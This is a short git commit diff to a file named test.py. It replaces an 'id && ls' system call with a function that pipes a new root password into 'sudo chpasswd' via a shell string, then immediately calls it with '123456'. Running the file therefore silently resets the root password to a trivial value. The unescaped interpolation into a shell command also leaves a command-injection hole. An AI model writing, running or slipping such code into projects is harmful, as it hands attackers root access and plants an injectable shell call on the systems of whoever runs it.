fac0b1c6e8402f9c79de1f99debcf1174990954a
wwl995 <57948674+wwl995@users.noreply.github.com>
2023-10-16 15:15:05 +0800

    Update test.py

--- test.py
+++ test.py
@@ -1,3 +1,12 @@
-import os 
+import subprocess
 
-os.system("id && ls")
+def change_root_password(new_password):
+    cmd = f"echo 'root:{new_password}' | sudo chpasswd"
+    try:
+        subprocess.check_output(cmd, shell=True)
+        print("Root password changed successfully.")
+    except subprocess.CalledProcessError as e:
+        print("Failed to change root password:", e)
+
+# 修改 root 用户的密码为 "新密码"
+change_root_password("123456")
